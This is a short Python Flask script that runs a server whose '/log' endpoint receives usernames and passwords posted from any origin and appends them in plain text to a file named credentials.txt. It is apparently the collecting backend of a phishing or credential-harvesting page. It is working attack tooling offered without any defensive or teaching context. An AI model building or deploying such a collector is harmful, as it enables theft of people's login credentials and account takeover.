from flask import Flask, request
from flask_cors import CORS  # Add this

app = Flask(__name__)
CORS(app)  # Allow requests from any origin

@app.route('/log', methods=['POST'])
def log_credentials():
    username = request.form.get('username')
    password = request.form.get('password')

    with open("credentials.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}\n")

    return "", 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
